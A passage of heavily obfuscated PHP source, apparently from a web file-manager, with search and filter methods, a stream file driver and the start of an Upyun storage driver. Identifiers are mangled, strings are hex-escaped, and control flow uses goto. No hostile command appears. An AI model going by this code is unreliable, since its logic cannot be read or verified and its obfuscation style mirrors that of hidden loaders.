$™Ğ¶ò¸’[$™ØÍĞÈŞ[541]], $™ØÍĞÈŞ[79] => $™Ğ¶ò¸’[$™ØÍĞÈŞ[79]], $™ØÍĞÈŞ[88] => time(), $™ØÍĞÈŞ[529] => USER_ID); Model($™ØÍĞÈŞ[879])->where(array($™ØÍĞÈŞ[193] => $õí¼´ô))->save($½³öŞ¹Ÿ); return $this->where(array($™ØÍĞÈŞ[493] => $Ç“ù’¥æ))->delete(); } public function clearSame($ı©´Ù¯) { $Ÿ­Í—³” =& $_SERVER[‹è™Ü¸Ñ]; $¦ò…×Í = $this->listData($ı©´Ù¯); $ó œÁ· = array_to_keyvalue_group($¦ò…×Í, $Ÿ­Í—³”[541]); $™¢òêâã = array(); $°—ûÄ¸ = array(); foreach ($ó œÁ· as $”‚ ÊÁ‰) { if (!$”‚ ÊÁ‰ || count($”‚ ÊÁ‰) <= 1) { continue; } foreach ($”‚ ÊÁ‰ as $à‰–ÌÑ›) { $™¢òêâã[] = $à‰–ÌÑ›[$Ÿ­Í—³”[541]]; $°—ûÄ¸[] = $à‰–ÌÑ›[$Ÿ­Í—³”[475]]; } } if (!$°—ûÄ¸) { return; } $this->where(array($Ÿ­Í—³”[475] => array($Ÿ­Í—³”[7], $°—ûÄ¸)))->delete(); Model($Ÿ­Í—³”[544])->remove($™¢òêâã); } public function userSpace() { $˜Êû½·Û =& $_SERVER[‹è™Ü¸Ñ]; $§¨Ÿ—×Â = $this->tablePrefix; $öüïìùØ = array($˜Êû½·Û[1743] => USER_ID); $ˆ¤Û­ûõ = "{$§¨Ÿ—×Â}\x69\157\x5f\146\x69\x6c\145\x20\x66\x69\154\x65\163\x20\157\156\40\146\x69\x6c\x65\x73\x2e\x66\x69\154\145\111\104\40\75\40\x68\151\x73\x74\157\x72\171\x2e\146\x69\154\x65\x49\x44"; return $this->alias($˜Êû½·Û[2210])->where($öüïìùØ)->join($ˆ¤Û­ûõ, $˜Êû½·Û[2211])->sum($˜Êû½·Û[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($’®ŒŠ¤€) { $¸Ü®¾¾ =& $_SERVER[‹è™Ü¸Ñ]; $æİÀÎ€³ = KodIO::fileTypeList(); $™âæİ‹³ = $æİÀÎ€³[$’®ŒŠ¤€]; if (!$™âæİ‹³) { return array(); } $÷ñúĞ’á = $™âæİ‹³[$¸Ü®¾¾[169]]; $ÊÌ–ø™¼ = $¸Ü®¾¾[7]; if (!$™âæİ‹³[$¸Ü®¾¾[169]]) { $ŒºŠ…ˆï = array_to_keyvalue($æİÀÎ€³, $¸Ü®¾¾[12], $¸Ü®¾¾[169]); $÷ñúĞ’á = implode($¸Ü®¾¾[50], $ŒºŠ…ˆï); $ÊÌ–ø™¼ = $¸Ü®¾¾[2213]; } $ˆ¢Ó€£´ = explode($¸Ü®¾¾[50], trim($÷ñúĞ’á, $¸Ü®¾¾[50])); return array($ÊÌ–ø™¼, $ˆ¢Ó€£´); } public function listPathType($°²Ä–¸) { $º¿´Ìş =& $_SERVER[‹è™Ü¸Ñ]; $™İôòç‡ = $this->fileTypeWhere($°²Ä–¸); if (!$™İôòç‡) { return array(); } $Åçüû§å = USER_ID; $¨ë–ìª„ = Model($º¿´Ìş[598])->getInfo($Åçüû§å); $–‰ëû¹• = array($º¿´Ìş[648] => SourceModel::TYPE_USER, $º¿´Ìş[584] => array($º¿´Ìş[612], $º¿´Ìş[594] . $¨ë–ìª„[$º¿´Ìş[90]][$º¿´Ìş[193]] . $º¿´Ìş[613]), $º¿´Ìş[649] => $Åçüû§å, $º¿´Ìş[646] => 0, $º¿´Ìş[647] => $™İôòç‡); return $this->listSource($–‰ëû¹•); } public function listSearch($Õ“Øıª”, $ÁÏß¬ãÉ = 300) { $Àà®úÊ± =& $_SERVER[‹è™Ü¸Ñ]; if (isset($Õ“Øıª”[$Àà®úÊ±[2049]]) && $Õ“Øıª”[$Àà®úÊ±[2049]]) { $Õ“Øıª”[$Àà®úÊ±[2049]] = str_replace($Àà®úÊ±[460], $Àà®úÊ±[2214], trim($Õ“Øıª”[$Àà®úÊ±[2049]])); } $ÄßŠê´ğ = $this->_parseSearchWhere($Õ“Øıª”); if (!isset($ÄßŠê´ğ[$Àà®úÊ±[505]])) { $ÄßŠê´ğ[$Àà®úÊ±[505]] = 0; } $œş¼ô…é = $Àà®úÊ±[2215]; $©İˆ©Ò = $ÄßŠê´ğ; $ßÇä½Î½ = $œş¼ô…é; $this->_listSearchBindPinyin($Õ“Øıª”, $ÄßŠê´ğ, $œş¼ô…é); $this->alias($Àà®úÊ±[519])->_makeOrder(); $ÄßŠê´ğ = $this->parseWhereLike($ÄßŠê´ğ); $÷ƒ¸Ô©ê = $this->distinct(!0)->field($œş¼ô…é)->where($ÄßŠê´ğ)->selectPage($ÁÏß¬ãÉ); if ($GLOBALS[$Àà®úÊ±[6]][$Àà®úÊ±[457]][$Àà®úÊ±[458]] && Input::check($Õ“Øıª”[$Àà®úÊ±[2049]], $Àà®úÊ±[655]) && $÷ƒ¸Ô©ê[$Àà®úÊ±[442]][$Àà®úÊ±[429]] == 1 && $÷ƒ¸Ô©ê[$Àà®úÊ±[442]][$Àà®úÊ±[443]] == 0) { $÷ƒ¸Ô©ê = $this->distinct(!0)->field($œş¼ô…é)->where($©İˆ©Ò)->limit(1000)->select(); $÷ƒ¸Ô©ê = array_page_split($÷ƒ¸Ô©ê, !1, $ÁÏß¬ãÉ); } $this->_listSearchFileContent($÷ƒ¸Ô©ê, $Õ“Øıª”, $ßÇä½Î½, $©İˆ©Ò); $this->_listSearchDesc($÷ƒ¸Ô©ê, $Õ“Øıª”, $ßÇä½Î½); $this->_listSearchTag($÷ƒ¸Ô©ê, $Õ“Øıª”, $ßÇä½Î½); $this->_listSearchGroupTag($÷ƒ¸Ô©ê, $Õ“Øıª”, $ßÇä½Î½); $this->_listDataApply($÷ƒ¸Ô©ê[$Àà®úÊ±[445]]); $this->_listMake($÷ƒ¸Ô©ê); return $÷ƒ¸Ô©ê; } private function _listSearchFileContent(&$şƒ«Ã¶Û, $äˆ«–¿«, $é ÕûÊ½, $èî™¸Ö·) { $Å‚Ò›ËŸ =& $_SERVER[‹è™Ü¸Ñ]; if (!$äˆ«–¿«[$Å‚Ò›ËŸ[2049]] || $şƒ«Ã¶Û[$Å‚Ò›ËŸ[442]][$Å‚Ò›ËŸ[429]] > 1) { return; } if (!isset($èî™¸Ö·[$Å‚Ò›ËŸ[32]]) || !is_array($äˆ«–¿«[$Å‚Ò›ËŸ[541]])) { return; } $èî™¸Ö·[$Å‚Ò›ËŸ[541]] = array($Å‚Ò›ËŸ[7], $äˆ«–¿«[$Å‚Ò›ËŸ[541]]); unset($èî™¸Ö·[$Å‚Ò›ËŸ[32]]); unset($äˆ«–¿«[$Å‚Ò›ËŸ[541]]); $ıåøø²´ = $this->field($é ÕûÊ½)->where($èî™¸Ö·)->limit($Å‚Ò›ËŸ[2216])->select(); if (!$ıåøø²´ || count($ıåøø²´) == 0) { return; } $şƒ«Ã¶Û[$Å‚Ò›ËŸ[445]] = array_merge($ıåøø²´, $şƒ«Ã¶Û[$Å‚Ò›ËŸ[445]]); $şƒ«Ã¶Û[$Å‚Ò›ËŸ[442]][$Å‚Ò›ËŸ[443]] += count($ıåøø²´); } private function _listSearchTag(&$¯¶ÔˆÖ², $Ñà¼Ö€, $œÏ¾®äº) { $Ë‡œĞã¹ =& $_SERVER[‹è™Ü¸Ñ]; if (!$Ñà¼Ö€[$Ë‡œĞã¹[2049]] || $¯¶ÔˆÖ²[$Ë‡œĞã¹[442]][$Ë‡œĞã¹[429]] > 1) { return; } $‡«­Ô„œ = Model($Ë‡œĞã¹[2217])->listData(); $ğÇ„Ù¹Ÿ = array(); $•¦„ØëÙ = $Ñà¼Ö€[$Ë‡œĞã¹[2049]]; foreach ($‡«­Ô„œ as $¬¥éæœ×) { $à½°ò = $¬¥éæœ×[$Ë‡œĞã¹[32]]; $º¥å›±§ = str_replace($Ë‡œĞã¹[53], $Ë‡œĞã¹[12], Pinyin::get($à½°ò)); if (stripos($à½°ò, $•¦„ØëÙ) !== !1 || stripos($º¥å›±§, $•¦„ØëÙ) !== !1) { $ğÇ„Ù¹Ÿ[] = $¬¥éæœ×[$Ë‡œĞã¹[475]]; } } if (!$ğÇ„Ù¹Ÿ) { return; } $¶Â œØ¤ = array($Ë‡œĞã¹[500] => array($Ë‡œĞã¹[7], $ğÇ„Ù¹Ÿ), $Ë‡œĞã¹[1752] => USER_ID); $¾«¦ˆÚÖ = Model($Ë‡œĞã¹[502])->field($Ë‡œĞã¹[87])->where($¶Â œØ¤)->select(); $¾«¦ˆÚÖ = array_to_keyvalue($¾«¦ˆÚÖ, $Ë‡œĞã¹[12], $Ë‡œĞã¹[87]); $©›¾ô› = array_unique($¾«¦ˆÚÖ); $this->_listSearchMerge($¯¶ÔˆÖ², $Ñà¼Ö€, $œÏ¾®äº, $©›¾ô›); } private function _listSearchDesc(&$×æ£šæœ, $ş¥˜†©, $¤ßÇ‡†–) { $øñ¹˜ë« =& $_SERVER[‹è™Ü¸Ñ]; if (!$ş¥˜†©[$øñ¹˜ë«[2049]] || $×æ£šæœ[$øñ¹˜ë«[442]][$øñ¹˜ë«[429]] > 1) { return; } $òş¾‡æ˜ = array($øñ¹˜ë«[97] => $øñ¹˜ë«[526], $øñ¹˜ë«[450] => array($øñ¹˜ë«[459], $øñ¹˜ë«[2051] . $ş¥˜†©[$øñ¹˜ë«[2049]] . $øñ¹˜ë«[2051])); $Ôå¸×Ê = !1; if ($Ôå¸×Ê) { $¬­“úù‰ = $this->listSearchChildren($ş¥˜†©[$øñ¹˜ë«[192]]); $¬­“úù‰ = array_unique($¬­“úù‰); if (!$¬­“úù‰) { return; } $òş¾‡æ˜[$øñ¹˜ë«[193]] = array($øñ¹˜ë«[7], $¬­“úù‰); } $˜ãÓ£‚× = Model($øñ¹˜ë«[632])->field($øñ¹˜ë«[193])->where($òş¾‡æ˜)->limit(5000)->select(); $ñ¯î¬æ¢ = array_to_keyvalue($˜ãÓ£‚×, $øñ¹˜ë«[12], $øñ¹˜ë«[193]); $this->_listSearchMerge($×æ£šæœ, $ş¥˜†©, $¤ßÇ‡†–, $ñ¯î¬æ¢); } private function _listSearchGroupTag(&$ö€Ø‡÷¾, $‚ƒï¨í‹, $¯¤ıÑÖ”) { $ú×íê‰² =& $_SERVER[‹è™Ü¸Ñ]; if (!$‚ƒï¨í‹[$ú×íê‰²[2049]] || $ö€Ø‡÷¾[$ú×íê‰²[442]][$ú×íê‰²[429]] > 1 || !$‚ƒï¨í‹[$ú×íê‰²[192]]) { return; } $”•ÅÍ½» = $this->sourceInfo($‚ƒï¨í‹[$ú×íê‰²[192]]); if (!$”•ÅÍ½» || $”•ÅÍ½»[$ú×íê‰²[190]] != SourceModel::TYPE_GROUP) { return; } $Ë„Œ™ = $”•ÅÍ½»[$ú×íê‰²[569]]; $ÜÖõ‰ƒÇ = Model($ú×íê‰²[2218])->get($Ë„Œ™); $µú€¡Æ = array(); $Å û‰öÒ = $‚ƒï¨í‹[$ú×íê‰²[2049]]; foreach ($ÜÖõ‰ƒÇ[$ú×íê‰²[445]] as $åğ™¨˜¡) { $Çé·Ôò = $åğ™¨˜¡[$ú×íê‰²[32]]; $ö¿Úâ½³ = str_replace($ú×íê‰²[53], $ú×íê‰²[12], Pinyin::get($Çé·Ôò)); if (stripos($Çé·Ôò, $Å û‰öÒ) !== !1 || stripos($ö¿Úâ½³, $Å û‰öÒ) !== !1) { $µú€¡Æ[] = $åğ™¨˜¡[$ú×íê‰²[475]]; } } if (!$µú€¡Æ) { return; } $ï†´Ïè = array($ú×íê‰²[500] => array($ú×íê‰²[7], $µú€¡Æ), $ú×íê‰²[1752] => 0, $ú×íê‰²[33] => $ú×íê‰²[2071] . $Ë„Œ™); $£œÌ¹óï = Model($ú×íê‰²[502])->field($ú×íê‰²[87])->where($ï†´Ïè)->select(); $£œÌ¹óï = array_to_keyvalue($£œÌ¹óï, $ú×íê‰²[12], $ú×íê‰²[87]); $¶Ô½¼Ù = array_unique($£œÌ¹óï); $this->_listSearchMerge($ö€Ø‡÷¾, $‚ƒï¨í‹, $¯¤ıÑÖ”, $¶Ô½¼Ù); } private function _listSearchMerge(&$ŠÌÙêê, $‡¦¡ï™, $ĞÏùÑ¡¨, $‹éÀ€ğ) { $Õñ¹ö¦š =& $_SERVER[‹è™Ü¸Ñ]; if (!$‹éÀ€ğ) { return; } $ªÉô£ÍÌ = array_to_keyvalue($ŠÌÙêê[$Õñ¹ö¦š[445]], $Õñ¹ö¦š[12], $Õñ¹ö¦š[193]); $³‚óŒã™ = array_diff($‹éÀ€ğ, $ªÉô£ÍÌ); if (!$³‚óŒã™) { return; } $·ø­Øİ = array($Õñ¹ö¦š[193] => array($Õñ¹ö¦š[7], $³‚óŒã™)); $ë€ó¯‚ = $this->field($ĞÏùÑ¡¨)->where($·ø­Øİ)->select(); if (!$ë€ó¯‚) { return; } $¹êºê˜Ì = array(); foreach ($ë€ó¯‚ as $¾áŠÛ§) { if ($this->_listSearchFilter($¾áŠÛ§, $‡¦¡ï™)) { $¹êºê˜Ì[] = $¾áŠÛ§; } } $ŠÌÙêê[$Õñ¹ö¦š[445]] = array_merge($¹êºê˜Ì, $ŠÌÙêê[$Õñ¹ö¦š[445]]); $ŠÌÙêê[$Õñ¹ö¦š[442]][$Õñ¹ö¦š[443]] += count($¹êºê˜Ì); } private function _listSearchFilter($’”ƒ½, $ÓŞå¯•¬) { $Ó×—»—² =& $_SERVER[‹è™Ü¸Ñ]; $ğÜ¦‰Á = $’”ƒ½[$Ó×—»—²[485]] == $Ó×—»—²[91]; if (!strstr($’”ƒ½[$Ó×—»—²[584]], $Ó×—»—²[50] . $ÓŞå¯•¬[$Ó×—»—²[192]] . $Ó×—»—²[50])) { return !1; } if (isset($ÓŞå¯•¬[$Ó×—»—²[486]]) && $ÓŞå¯•¬[$Ó×—»—²[486]] != $Ó×—»—²[831]) { if ($ÓŞå¯•¬[$Ó×—»—²[486]] == $Ó×—»—²[78] && !$ğÜ¦‰Á) { return !1; } if ($ÓŞå¯•¬[$Ó×—»—²[486]] != $Ó×—»—²[78] && $ğÜ¦‰Á) { return !1; } if (!strstr($’”ƒ½[$Ó×—»—²[169]], $Ó×—»—²[50] . $ÓŞå¯•¬[$Ó×—»—²[486]] . $Ó×—»—²[50])) { return !1; } } if (isset($ÓŞå¯•¬[$Ó×—»—²[2219]]) && $ÓŞå¯•¬[$Ó×—»—²[2219]] < $’”ƒ½[$Ó×—»—²[79]]) { return !1; } if (isset($ÓŞå¯•¬[$Ó×—»—²[2220]]) && $ÓŞå¯•¬[$Ó×—»—²[2220]] > $’”ƒ½[$Ó×—»—²[79]]) { return !1; } if (isset($ÓŞå¯•¬[$Ó×—»—²[662]]) && $ÓŞå¯•¬[$Ó×—»—²[662]] != $’”ƒ½[$Ó×—»—²[529]]) { return !1; } return !0; } public function listSearchChildren($£ã¬÷Æİ, $ÏÊ—ˆÑï = 5000) { $ö¡·’òÏ =& $_SERVER[‹è™Ü¸Ñ]; $„“›­¹­ = array(); $Üâ½ÔÆ = $this->sourceInfo($£ã¬÷Æİ); $ú “Ä›Û = array($ö¡·’òÏ[584] => array($ö¡·’òÏ[459], $Üâ½ÔÆ[$ö¡·’òÏ[584]] . $Üâ½ÔÆ[$ö¡·’òÏ[193]] . $ö¡·’òÏ[613])); $º‰÷¼İ¸ = $this->field($ö¡·’òÏ[79])->where($ú “Ä›Û)->limit($ÏÊ—ˆÑï + 1)->select(); $²Œöœ¢é = is_array($º‰÷¼İ¸) ? count($º‰÷¼İ¸) : 0; if ($²Œöœ¢é > $ÏÊ—ˆÑï) { return $this->_listSearchChildrenNear($£ã¬÷Æİ, $ÏÊ—ˆÑï); } $ÑƒçÂÀ = $this->field($ö¡·’òÏ[193])->where($ú “Ä›Û)->select(); $„“›­¹­ = array_to_keyvalue($ÑƒçÂÀ, $ö¡·’òÏ[12], $ö¡·’òÏ[193]); return $„“›­¹­; } private function _listSearchChildrenNear($ƒÊŸÇ, $Çú¶˜¯¯) { $©ñçôçÍ =& $_SERVER[‹è™Ü¸Ñ]; $ãúËÅÚú = array(); $Ş‹ÂÀ¤² = array($©ñçôçÍ[192] => $ƒÊŸÇ); $ôó®õÚ€ = $this->field($©ñçôçÍ[2221])->where($Ş‹ÂÀ¤²)->select(); $Šš•İ„¦ = array_to_keyvalue(array_filter_by_field($ôó®õÚ€, $©ñçôçÍ[485], $©ñçôçÍ[91]), $©ñçôçÍ[12], $©ñçôçÍ[193]); $ãúËÅÚú = array_merge($ãúËÅÚú, array_to_keyvalue($ôó®õÚ€, $©ñçôçÍ[12], $©ñçôçÍ[193])); if (!$Šš•İ„¦) { return $ãúËÅÚú; } $Ş‹ÂÀ¤² = array($©ñçôçÍ[192] => array($©ñçôçÍ[7], $Šš•İ„¦)); $ôó®õÚ€ = $this->field($©ñçôçÍ[2221])->where($Ş‹ÂÀ¤²)->limit($Çú¶˜¯¯)->select(); $ãúËÅÚú = array_merge($ãúËÅÚú, array_to_keyvalue($ôó®õÚ€, $©ñçôçÍ[12], $©ñçôçÍ[193])); $ãúËÅÚú = array_slice($ãúËÅÚú, 0, intval($Çú¶˜¯¯)); return $ãúËÅÚú; } private function _listSearchBindPinyin($§Î´Û, &$‚àİ€ˆ‘, &$„ÓŠŸ¾Ç) { $œÊ¥Û”ö =& $_SERVER[‹è™Ü¸Ñ]; if (!isset($§Î´Û[$œÊ¥Û”ö[2049]]) || !$§Î´Û[$œÊ¥Û”ö[2049]]) { return; } if (!Input::check($§Î´Û[$œÊ¥Û”ö[2049]], $œÊ¥Û”ö[394]) || strlen($§Î´Û[$œÊ¥Û”ö[2049]]) < 2) { return; } $¼×ÂúÌ‹ = "\x4c\x45\x46\124\x20\112\x4f\x49\116\x20{$this->tablePrefix}\x69\x6f\x5f\163\x6f\165\162\x63\x65\x5f\155\x65\164\x61\x20\x6d\x65\164\x61\40\x6f\156\40\x73\x6f\165\x72\143\145\x2e\163\157\165\162\x63\x65\x49\x44\40\75\x20\155\145\x74\x61\x2e\x73\157\x75\x72\x63\145\111\x44"; $Å“Æê¥Ä = array(); $„ÓŠŸ¾Ç = str_replace(array($œÊ¥Û”ö[262], $œÊ¥Û”ö[53], $œÊ¥Û”ö[2222]), $œÊ¥Û”ö[12], $„ÓŠŸ¾Ç); $„ÓŠŸ¾Ç = $œÊ¥Û”ö[511] . str_replace($œÊ¥Û”ö[50], $œÊ¥Û”ö[512], $„ÓŠŸ¾Ç); $«ˆ©€ô = $‚àİ€ˆ‘[$œÊ¥Û”ö[32]]; unset($‚àİ€ˆ‘[$œÊ¥Û”ö[32]]); foreach ($‚àİ€ˆ‘ as $§šÉùªƒ => $õ–Ë¨û ) { $Å“Æê¥Ä[$œÊ¥Û”ö[511] . $§šÉùªƒ] = $õ–Ë¨û ; } foreach ($«ˆ©€ô as $‰ßªÒş€) { $Å“Æê¥Ä[] = array($œÊ¥Û”ö[516] => $‰ßªÒş€, $œÊ¥Û”ö[1058] => $œÊ¥Û”ö[2053], array($œÊ¥Û”ö[2223] => $‰ßªÒş€, $œÊ¥Û”ö[2224] => array($œÊ¥Û”ö[7], array($œÊ¥Û”ö[538], $œÊ¥Û”ö[537])))); } $this->join($¼×ÂúÌ‹); $‚àİ€ˆ‘ = $Å“Æê¥Ä; } private function _parseSearchWhere($Ş™×¨‡Ë) { $éÕŒ‚òÏ =& $_SERVER[‹è™Ü¸Ñ]; $Ÿ¿ŠŸÛ = array(); if (isset($Ş™×¨‡Ë[$éÕŒ‚òÏ[815]]) && $Ş™×¨‡Ë[$éÕŒ‚òÏ[815]]) { $Ÿ¿ŠŸÛ[$éÕŒ‚òÏ[88]] = array($éÕŒ‚òÏ[2225], $Ş™×¨‡Ë[$éÕŒ‚òÏ[815]]); } if (isset($Ş™×¨‡Ë[$éÕŒ‚òÏ[816]]) && $Ş™×¨‡Ë[$éÕŒ‚òÏ[816]]) { $¹¼’È¤­ = array($éÕŒ‚òÏ[2226], $Ş™×¨‡Ë[$éÕŒ‚òÏ[816]]); if ($Ÿ¿ŠŸÛ[$éÕŒ‚òÏ[88]]) { $Ÿ¿ŠŸÛ[$éÕŒ‚òÏ[88]] = array($Ÿ¿ŠŸÛ[$éÕŒ‚òÏ[88]], $¹¼’È¤­, $éÕŒ‚òÏ[2227]); } else { $Ÿ¿ŠŸÛ[$éÕŒ‚òÏ[88]] = $¹¼’È¤­; } } if (isset($Ş™×¨‡Ë[$éÕŒ‚òÏ[2219]]) && $Ş™×¨‡Ë[$éÕŒ‚òÏ[2219]] > 0) { $Ÿ¿ŠŸÛ[$éÕŒ‚òÏ[79]] = array($éÕŒ‚òÏ[2225], $Ş™×¨‡Ë[$éÕŒ‚òÏ[2219]]); } if (isset($Ş™×¨‡Ë[$éÕŒ‚òÏ[2220]]) && $Ş™×¨‡Ë[$éÕŒ‚òÏ[2220]]) { $¹¼’È¤­ = array($éÕŒ‚òÏ[2226], $Ş™×¨‡Ë[$éÕŒ‚òÏ[2220]]); if ($Ÿ¿ŠŸÛ[$éÕŒ‚òÏ[79]]) { $Ÿ¿ŠŸÛ[$éÕŒ‚òÏ[79]] = array($Ÿ¿ŠŸÛ[$éÕŒ‚òÏ[79]], $¹¼’È¤­, $éÕŒ‚òÏ[2227]); } else { $Ÿ¿ŠŸÛ[$éÕŒ‚òÏ[79]] = $¹¼’È¤­; } } if (isset($Ş™×¨‡Ë[$éÕŒ‚òÏ[662]]) && $Ş™×¨‡Ë[$éÕŒ‚òÏ[662]]) { $Ÿ¿ŠŸÛ[] = array($éÕŒ‚òÏ[529] => $Ş™×¨‡Ë[$éÕŒ‚òÏ[662]], $éÕŒ‚òÏ[527] => $Ş™×¨‡Ë[$éÕŒ‚òÏ[662]], $éÕŒ‚òÏ[1058] => $éÕŒ‚òÏ[2053]); } if (isset($Ş™×¨‡Ë[$éÕŒ‚òÏ[486]]) && $Ş™×¨‡Ë[$éÕŒ‚òÏ[486]]) { $€æÔ…—– = $Ş™×¨‡Ë[$éÕŒ‚òÏ[486]]; if ($€æÔ…—– == $éÕŒ‚òÏ[78]) { $Ÿ¿ŠŸÛ[$éÕŒ‚òÏ[485]] = 1; } else { if ($€æÔ…—– == $éÕŒ‚òÏ[2228]) { $Ÿ¿ŠŸÛ[$éÕŒ‚òÏ[485]] = 0; } else { if ($€æÔ…—–) { $€æÔ…—– = is_array($€æÔ…—–) ? $€æÔ…—– : explode($éÕŒ‚òÏ[50], $€æÔ…—–); $Ÿ¿ŠŸÛ[$éÕŒ‚òÏ[486]] = array($éÕŒ‚òÏ[492], $€æÔ…—–); $Ÿ¿ŠŸÛ[$éÕŒ‚òÏ[485]] = 0; } } } } $this->_parseSearchParent($Ş™×¨‡Ë, $Ÿ¿ŠŸÛ); if (isset($Ş™×¨‡Ë[$éÕŒ‚òÏ[2049]]) && trim($Ş™×¨‡Ë[$éÕŒ‚òÏ[2049]])) { $´ª®¥ê = trim($Ş™×¨‡Ë[$éÕŒ‚òÏ[2049]]); $£ÀÇ¥º = explode($éÕŒ‚òÏ[53], $´ª®¥ê); if (strlen($´ª®¥ê) > 2 && (substr($´ª®¥ê, 0, 1) == $éÕŒ‚òÏ[121] && substr($´ª®¥ê, -1) == $éÕŒ‚òÏ[121]) || substr($´ª®¥ê, 0, 1) == $éÕŒ‚òÏ[58] && substr($´ª®¥ê, -1) == $éÕŒ‚òÏ[58]) { $´ª®¥ê = substr($´ª®¥ê, 1, -1); $£ÀÇ¥º = array($´ª®¥ê); } $Ÿ¿ŠŸÛ[$éÕŒ‚òÏ[32]] = array(array($éÕŒ‚òÏ[612], $éÕŒ‚òÏ[2051] . $´ª®¥ê . $éÕŒ‚òÏ[2051])); if (count($£ÀÇ¥º) > 1) { $Ÿ¿ŠŸÛ[$éÕŒ‚òÏ[32]] = array(); foreach ($£ÀÇ¥º as $ş¬¼–õÙ) { if (!trim($ş¬¼–õÙ)) { continue; } $Ÿ¿ŠŸÛ[$éÕŒ‚òÏ[32]][] = array($éÕŒ‚òÏ[612], $éÕŒ‚òÏ[2051] . trim($ş¬¼–õÙ) . $éÕŒ‚òÏ[2051]); } } } return $Ÿ¿ŠŸÛ; } private function _parseSearchParent($¦ñø…Õš, &$©şìğ­£) { $ŠØû¬ë‘ =& $_SERVER[‹è™Ü¸Ñ]; if (!isset($¦ñø…Õš[$ŠØû¬ë‘[192]]) || !$¦ñø…Õš[$ŠØû¬ë‘[192]]) { return; } $¢Ä´™’Á = $this->pathInfo($¦ñø…Õš[$ŠØû¬ë‘[192]]); $À™÷ã¬í = $¢Ä´™’Á[$ŠØû¬ë‘[192]] . $ŠØû¬ë‘[12] === $ŠØû¬ë‘[228]; $Âú»Åşƒ = $¢Ä´™’Á[$ŠØû¬ë‘[190]] == $ŠØû¬ë‘[578]; if ($¢Ä´™’Á[$ŠØû¬ë‘[595]] == $ŠØû¬ë‘[596]) { $œ”òôÇõ = $this->sourceInfo($¦ñø…Õš[$ŠØû¬ë‘[192]]); $¢Ä´™’Á[$ŠØû¬ë‘[584]] = $œ”òôÇõ[$ŠØû¬ë‘[584]]; } $©şìğ­£[$ŠØû¬ë‘[652]] = array($ŠØû¬ë‘[612], $¢Ä´™’Á[$ŠØû¬ë‘[584]] . $¦ñø…Õš[$ŠØû¬ë‘[192]] . $ŠØû¬ë‘[613]); $ªŒßÊçĞ = isset($¦ñø…Õš[$ŠØû¬ë‘[1909]]) && in_array($ŠØû¬ë‘[578], $¦ñø…Õš[$ŠØû¬ë‘[1909]]); if (!$ªŒßÊçĞ || !$Âú»Åşƒ || !$À™÷ã¬í || !$¢Ä´™’Á[$ŠØû¬ë‘[487]]) { return; } if (!AuthModel::authCheckRoot($¢Ä´™’Á[$ŠØû¬ë‘[487]][$ŠØû¬ë‘[488]])) { return; } $Š–¼ÅÖè = $¢Ä´™’Á[$ŠØû¬ë‘[569]] . $ŠØû¬ë‘[12]; if ($Š–¼ÅÖè == $ŠØû¬ë‘[91]) { unset($©şìğ­£[$ŠØû¬ë‘[652]]); $©şìğ­£[$ŠØû¬ë‘[190]] = self::TYPE_GROUP; return; } $÷½€ôÈ§ = Model($ŠØû¬ë‘[585])->groupChildrenAll($Š–¼ÅÖè); $öÒÚÒæĞ = count($÷½€ôÈ§); if ($öÒÚÒæĞ <= 1) { return; } $²ÃÌúñ÷ = array($ŠØû¬ë‘[192] => 0, $ŠØû¬ë‘[190] => self::TYPE_GROUP, $ŠØû¬ë‘[569] => array($ŠØû¬ë‘[7], $÷½€ôÈ§)); $ÎÓÀÍØÉ = $this->field($ŠØû¬ë‘[2229])->where($²ÃÌúñ÷)->limit($öÒÚÒæĞ)->select(); $©şìğ­£[$ŠØû¬ë‘[652]] = array(); foreach ($ÎÓÀÍØÉ as $Áõğ‡´Å) { $©şìğ­£[$ŠØû¬ë‘[652]][] = array($ŠØû¬ë‘[612], $ŠØû¬ë‘[594] . $Áõğ‡´Å[$ŠØû¬ë‘[193]] . $ŠØû¬ë‘[613]); } $©şìğ­£[$ŠØû¬ë‘[652]][] = $ŠØû¬ë‘[2053]; } } goto A’†…´ç˜; D×ŒÁïÊŒ™: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($¿‚‚€»™, $êãÜªÙá = 0) { parent::__construct(); $this->source = $¿‚‚€»™; $this->sourceSize = $êãÜªÙá; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($¯”ïÃşï = false) { return $this->sourceSize; } public function getContent($Àé¨÷á = false) { return $this->fileSubstr($Àé¨÷á, 0, $this->sourceSize); } public function fileSubstr($—à²£ìÆ = false, $Š­º­ÃÛ = 0, $ÂµöÜÄË = 0) { if (!$ÂµöÜÄË) { $ÂµöÜÄË = $this->sourceSize; } $÷¸ó¤°§ = $this->sourceSize - $Š­º­ÃÛ; if ($ÂµöÜÄË >= $÷¸ó¤°§) { $ÂµöÜÄË = $÷¸ó¤°§; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Š­º­ÃÛ, $ÂµöÜÄË); } if ($this->sourceType == self::TYPE_FILE) { if ($ÂµöÜÄË <= 0) { return $_SERVER[‹è™Ü¸Ñ][12]; } $¡ÂÖ¯‰õ = ftell($this->source); fseek_64($this->source, $¡ÂÖ¯‰õ + $Š­º­ÃÛ); $¿¼ùÒ­Ä = @fread($this->source, $ÂµöÜÄË); fseek_64($this->source, $¡ÂÖ¯‰õ); return $¿¼ùÒ­Ä; } } public function hashMd5($ƒ¸Ñ è¿ = false) { return md5($this->getContent()); } public static function hash($ø¥¤‘¬ï, $§ä¸ìßê = 0) { $à…§ÈşÚ = new PathDriverStream($ø¥¤‘¬ï, $§ä¸ìßê); return $à…§ÈşÚ->hashSimple($ø¥¤‘¬ï); } public static function md5($¡Ç›Ïêë, $¸¬÷›÷ì = 0) { $¯è‚Á¬ï = new PathDriverStream($¡Ç›Ïêë, $¸¬÷›÷ì); return $¯è‚Á¬ï->hashMd5($¡Ç›Ïêë); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\x3a\57\x2f\166\60\x2e\x61\160\151\56\165\x70\x79\x75\156\56\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($°ı„‚³‚) { parent::__construct(); $this->_init($°ı„‚³‚); } public function _init($üœËË²¢) { $Ğ¤¢”„¢ =& $_SERVER[‹è™Ü¸Ñ]; foreach ($üœËË²¢ as 